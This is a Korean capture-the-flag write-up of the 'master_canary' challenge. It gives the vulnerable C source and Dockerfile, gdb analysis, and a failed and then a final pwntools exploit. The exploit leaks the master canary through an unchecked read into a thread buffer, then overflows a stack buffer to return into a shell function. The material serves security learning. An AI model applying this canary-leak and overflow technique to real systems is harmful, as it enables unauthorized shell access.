# master_canary  

**실습환경**
```
Ubuntu 16.04
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```


**Dockerfile**

```docker
FROM ubuntu:16.04@sha256:1f1a2d56de1d604801a9671f301190704c25d604a416f59e03c04f5c6ffee0d6

ENV user master_canary
ENV chall_port 10001

RUN apt-get update
RUN apt-get install -y socat

RUN adduser $user

ADD ./flag /home/$user/flag
ADD ./$user /home/$user/$user

RUN chown -R root:root /home/$user
RUN chown root:$user /home/$user/flag
RUN chown root:$user /home/$user/$user

RUN chmod 755 /home/$user/$user
RUN chmod 440 /home/$user/flag

WORKDIR /home/$user
USER $user
EXPOSE $chall_port
CMD socat -T 10 TCP-LISTEN:$chall_port,reuseaddr,fork EXEC:/home/$user/$user
```

**master_canary.c**
```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <pthread.h>

char *global_buffer;

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

void get_shell() {
    system("/bin/sh");
}

void *thread_routine() {
    char buf[256];

    global_buffer = buf;
}

void read_bytes(char *buf, size_t size) {
    size_t sz = 0;
    size_t idx = 0;
    size_t tmp;

    while (sz < size) {
        tmp = read(0, &buf[idx], 1);
        if (tmp != 1) {
            exit(-1);
        }
        idx += 1;
        sz += 1;
    }
    return;
}

int main(int argc, char *argv[]) {
    size_t size = 0;
    pthread_t thread_t;
    int idx = 0;
    char leave_comment[32];

    initialize();

    while (1) {
        printf("1. Create thread\n");
        printf("2. Input\n");
        printf("3. Exit\n");
        printf("> ");
        scanf("%d", &idx);

        switch (idx) {
            case 1:
                if (pthread_create(&thread_t, NULL, thread_routine, NULL) < 0) {
                    perror("thread create error");
                    exit(0);
                }
                break;
            case 2:
                printf("Size: ");
                scanf("%lu", &size);

                printf("Data: ");
                read_bytes(global_buffer, size);

                printf("Data: %s", global_buffer);
                break;
            case 3:
                printf("Leave comment: ");
                read(0, leave_comment, 1024);
                return 0;
            default:
                printf("Nope\n");
                break;
        }
    }

    return 0;
}
```

<br>

**코드 분석**  

일단 3번 case에서 오버플로우가 일어나는게 너무 잘 보인다. 저기서 `get_shell`로 리턴 주소를 조작하면 될 것 같고, 카나리는 2번으로 릭하는게 유일한 방법으로 보인다.   

또한 `read_byte`의 로직을 살펴보면, 사이즈를 사용자에게 받고, 그만큼을 검증 없이 그냥 읽어버린다. 심지어 뒤에 `printf`까지있고, `%s`로 널 문자가 올 때까지 읽으니, 카나리를 읽어낼 수 있을 것 같다.  


<br>

**동적 분석**

```python
pwndbg> disassem main
Dump of assembler code for function main:
   0x0000000000400b05 <+0>:     push   rbp
   0x0000000000400b06 <+1>:     mov    rbp,rsp
   0x0000000000400b09 <+4>:     sub    rsp,0x60
   0x0000000000400b0d <+8>:     mov    DWORD PTR [rbp-0x54],edi
   0x0000000000400b10 <+11>:    mov    QWORD PTR [rbp-0x60],rsi
   0x0000000000400b14 <+15>:    mov    rax,QWORD PTR fs:0x28
   0x0000000000400b1d <+24>:    mov    QWORD PTR [rbp-0x8],rax
   0x0000000000400b21 <+28>:    xor    eax,eax
   0x0000000000400b23 <+30>:    mov    QWORD PTR [rbp-0x40],0x0
   0x0000000000400b2b <+38>:    mov    DWORD PTR [rbp-0x44],0x0
   0x0000000000400b32 <+45>:    mov    eax,0x0
   0x0000000000400b37 <+50>:    call   0x4009ee <initialize>
   0x0000000000400b3c <+55>:    mov    edi,0x400d25
   0x0000000000400b41 <+60>:    call   0x400810 <puts@plt>
   0x0000000000400b46 <+65>:    mov    edi,0x400d36
   0x0000000000400b4b <+70>:    call   0x400810 <puts@plt>
   0x0000000000400b50 <+75>:    mov    edi,0x400d3f
   0x0000000000400b55 <+80>:    call   0x400810 <puts@plt>
   0x0000000000400b5a <+85>:    mov    edi,0x400d47
   0x0000000000400b5f <+90>:    mov    eax,0x0
   0x0000000000400b64 <+95>:    call   0x400840 <printf@plt>
   0x0000000000400b69 <+100>:   lea    rax,[rbp-0x44]
   0x0000000000400b6d <+104>:   mov    rsi,rax
   0x0000000000400b70 <+107>:   mov    edi,0x400d4a
   0x0000000000400b75 <+112>:   mov    eax,0x0
   0x0000000000400b7a <+117>:   call   0x4008b0 <__isoc99_scanf@plt>
   0x0000000000400b7f <+122>:   mov    eax,DWORD PTR [rbp-0x44]
   0x0000000000400b82 <+125>:   cmp    eax,0x2
   0x0000000000400b85 <+128>:   je     0x400bd0 <main+203>
   0x0000000000400b87 <+130>:   cmp    eax,0x3
   0x0000000000400b8a <+133>:   je     0x400c35 <main+304>
   0x0000000000400b90 <+139>:   cmp    eax,0x1
   0x0000000000400b93 <+142>:   jne    0x400c70 <main+363>
   0x0000000000400b99 <+148>:   lea    rax,[rbp-0x38]
   0x0000000000400b9d <+152>:   mov    ecx,0x0
   0x0000000000400ba2 <+157>:   mov    edx,0x400a5b
   0x0000000000400ba7 <+162>:   mov    esi,0x0
   0x0000000000400bac <+167>:   mov    rdi,rax
   0x0000000000400baf <+170>:   call   0x400800 <pthread_create@plt>
   0x0000000000400bb4 <+175>:   test   eax,eax
   0x0000000000400bb6 <+177>:   jns    0x400c7c <main+375>
   0x0000000000400bbc <+183>:   mov    edi,0x400d4d
   0x0000000000400bc1 <+188>:   call   0x4008a0 <perror@plt>
   0x0000000000400bc6 <+193>:   mov    edi,0x0
   0x0000000000400bcb <+198>:   call   0x4008c0 <exit@plt>
   0x0000000000400bd0 <+203>:   mov    edi,0x400d61
   0x0000000000400bd5 <+208>:   mov    eax,0x0
   0x0000000000400bda <+213>:   call   0x400840 <printf@plt>
   0x0000000000400bdf <+218>:   lea    rax,[rbp-0x40]
   0x0000000000400be3 <+222>:   mov    rsi,rax
   0x0000000000400be6 <+225>:   mov    edi,0x400d68
   0x0000000000400beb <+230>:   mov    eax,0x0
   0x0000000000400bf0 <+235>:   call   0x4008b0 <__isoc99_scanf@plt>
   0x0000000000400bf5 <+240>:   mov    edi,0x400d6c
   0x0000000000400bfa <+245>:   mov    eax,0x0
   0x0000000000400bff <+250>:   call   0x400840 <printf@plt>
   0x0000000000400c04 <+255>:   mov    rdx,QWORD PTR [rbp-0x40]
   0x0000000000400c08 <+259>:   mov    rax,QWORD PTR [rip+0x2014a1]        # 0x6020b0 <global_buffer>
   0x0000000000400c0f <+266>:   mov    rsi,rdx
   0x0000000000400c12 <+269>:   mov    rdi,rax
   0x0000000000400c15 <+272>:   call   0x400a9a <read_bytes>
   0x0000000000400c1a <+277>:   mov    rax,QWORD PTR [rip+0x20148f]        # 0x6020b0 <global_buffer>
   0x0000000000400c21 <+284>:   mov    rsi,rax
   0x0000000000400c24 <+287>:   mov    edi,0x400d73
   0x0000000000400c29 <+292>:   mov    eax,0x0
   0x0000000000400c2e <+297>:   call   0x400840 <printf@plt>
   0x0000000000400c33 <+302>:   jmp    0x400c7d <main+376>
   0x0000000000400c35 <+304>:   mov    edi,0x400d7c
   0x0000000000400c3a <+309>:   mov    eax,0x0
   0x0000000000400c3f <+314>:   call   0x400840 <printf@plt>
   0x0000000000400c44 <+319>:   lea    rax,[rbp-0x30]
   0x0000000000400c48 <+323>:   mov    edx,0x400
   0x0000000000400c4d <+328>:   mov    rsi,rax
   0x0000000000400c50 <+331>:   mov    edi,0x0
   0x0000000000400c55 <+336>:   call   0x400860 <read@plt>
   0x0000000000400c5a <+341>:   mov    eax,0x0
   0x0000000000400c5f <+346>:   mov    rcx,QWORD PTR [rbp-0x8]
   0x0000000000400c63 <+350>:   xor    rcx,QWORD PTR fs:0x28
   0x0000000000400c6c <+359>:   je     0x400c87 <main+386>
   0x0000000000400c6e <+361>:   jmp    0x400c82 <main+381>
   0x0000000000400c70 <+363>:   mov    edi,0x400d8c
   0x0000000000400c75 <+368>:   call   0x400810 <puts@plt>
   0x0000000000400c7a <+373>:   jmp    0x400c7d <main+376>
   0x0000000000400c7c <+375>:   nop
   0x0000000000400c7d <+376>:   jmp    0x400b3c <main+55>
   0x0000000000400c82 <+381>:   call   0x400820 <__stack_chk_fail@plt>
   0x0000000000400c87 <+386>:   leave
   0x0000000000400c88 <+387>:   ret
```

<br>

<img width="1436" height="703" alt="image" src="https://github.com/user-attachments/assets/84e370e2-d6d9-45e8-8159-9347ec97db3a" />

main+336에 브레이크를 걸고, 바로 3번부터 확인해줬다.  

A를 32바이트 넣었더니 위 구조가 나왔다. 그리고 `leave_comment`는 1024 바이트를 읽으니까 뒤에 리턴 주소까지 쉽게 덮어낼 수 있을 것으로 보인다.    

- A*40 + canary + B*8 + get_shell

이렇게 덮으면 되겠다. 이제 카나리를 구하러 가보자.   

<br>

<img width="1383" height="916" alt="image" src="https://github.com/user-attachments/assets/e6cb3435-3fe7-4d32-bff2-0ab5226108bb" />

새로 gdb 를 열어주고,    
`read_bytes` 함수에 브레이크를 걸고 A를 입력했다. 그리고 A가 입력된 곳을 살펴보니, 카나리가 137바이트 떨어진 곳에 존재했다.     


바로 익스플로잇 코드를 짜보자.    


<br>

**익스플로잇 코드 (실패)**

```python
from pwn import *

p = process('./master_canary')
e = ELF('./master_canary')

getshell_addr = e.symbols['get_shell']

p.sendlineafter(b'> ', b'1')

p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'Size: ', b'137')
p.recvuntil(b'Data: ')

payload = b'A'*136 + b'B' 
p.send(payload)

p.recvuntil(b'B')
leaked = p.recv(7)
canary = u64(b'\x00' + leaked)

print('getshell addr : ',hex(getshell_addr))
print('canary : ', hex(canary))

p.sendlineafter(b'> ', b'3')

payload2 = b'A'*40
payload2 += p64(canary)
payload2 += b'B'*8
payload2 += p64(getshell_addr)

p.sendlineafter(b'comment: ', payload2)

p.interactive()

```


실패했다.   

혹시 몰리서 서버에도 여러번 날려봤는데, 카나리 값이 고정으로 나오는 걸 봐서 카나리를 잘못 구한거같다.   
환경 차이 때문에 분석이 이상하게 된 것 같으니 도커로 들어가서 분석해보자.   

<br>

### 환경 맞춰서 동적 분석

우분투 16.04 버전으로 들어왔다.  
해당 파일에는 gdb 가 없으니 대충 깔아줬다.   


<img width="1349" height="946" alt="image (10)" src="https://github.com/user-attachments/assets/f8178226-17bb-4721-861f-b2250bdbd2ac" />  

우선 main+336 에 브레이크를 걸어주고 3번으로 들어가서 스택 구조가 맞았는지부터 확인해줬다.   

사진에 보이듯이 스택 구조는 동일했다.   

| leave_comment | 32 바이트 |
| --- | --- |
| 임의 값 | 8 바이트 |
| canary  | 8 바이트 |
| 임의값(sfp?) | 8 바이트 |
| **리턴주소** | 8 바이트 |


위 구조이니 40바이트 임의값 + 카나리 + 8바이트 임의값 + 기브쉘 함수 주소로 맞게 짰다.    

<br>

<img width="1435" height="1533" alt="image (11)" src="https://github.com/user-attachments/assets/a66e1852-0fab-45ad-8ada-da75f72b21d0" />


gdb 다시 열어주고,  
이제 `read_bytes`에 브레이크를 걸고 살펴보자.  

대충 A 하나 입력하고 스택을 살펴봤다.   

<br>

<img width="1032" height="313" alt="image (12)" src="https://github.com/user-attachments/assets/8d24a12d-912a-44bc-b411-ece1b2a24f3d" />

일단 여기 카나리 값을 기억해두고,   

<br>

<img width="1204" height="916" alt="image (13)" src="https://github.com/user-attachments/assets/c555e2ab-f869-4cfc-baa2-6ec0314e1f80" />


A가 들어가는 주소로 이동해서 살펴보자.   

이전에 본 것과 확실히 다른 구조이다.   
여기서 틀렸었던 걸 알아냈다.   

그럼 여기 시작 주소를 기억해두고, `0x00007c3611510e40` 카나리값을 읽을 수 있는 곳이 있을지 쭉 살펴보자.  

 <br>
 
<img width="1277" height="1092" alt="image (14)" src="https://github.com/user-attachments/assets/bd56ff62-3b3f-4f85-a2b6-677640f181c6" />

꽤 많이 내려왔는데도 없다.   

더 쭉 내려가주니,   

<br>


<img width="1331" height="796" alt="image (15)" src="https://github.com/user-attachments/assets/2ecf91fb-e1ad-47d0-88a1-de47cbf5321e" />

이렇게 찾아냈다.   
여기까지 거리를 구하고 저기 있는 값을 읽어내보자.   

`0x7c3611511720`를 기준으로 빼고, 8바이트를 더하면 카나리 8바이트 위치가 나올것이다.   

```bash
(gdb) print 0x7c3611511720 - 0x00007c3611510e40
$1 = 2272
```

2272 바이트라는 값이 나왔으니, 2272 바이트 + 8바이트 떨어져있는 곳에 카나리가 있는 것을 알아냈다.   

이제 코드를 수정해보면,   

<br>

**익스플로잇 코드 (최종)**

```python
from pwn import *

#p = process('./master_canary')
p = remote('host8.dreamhack.games', 16130)
e = ELF('./master_canary')

getshell_addr = e.symbols['get_shell']

p.sendlineafter(b'> ', b'1')

p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'Size: ', b'2281')
p.recvuntil(b'Data: ')

payload = b'A'*2280 + b'B'
p.send(payload)

p.recvuntil(b'B')
leaked = p.recv(7)
canary = u64(b'\x00' + leaked)

print('getshell addr : ',hex(getshell_addr))
print('canary : ', hex(canary))

p.sendlineafter(b'> ', b'3')

payload2 = b'A'*40
payload2 += p64(canary)
payload2 += b'B'*8
payload2 += p64(getshell_addr)

p.sendlineafter(b'comment: ', payload2)

p.interactive()
```
<br>


<img width="1305" height="490" alt="image (16)" src="https://github.com/user-attachments/assets/b117f168-410b-4b75-9118-3460d77cd9e7" />

답이 나왔다!










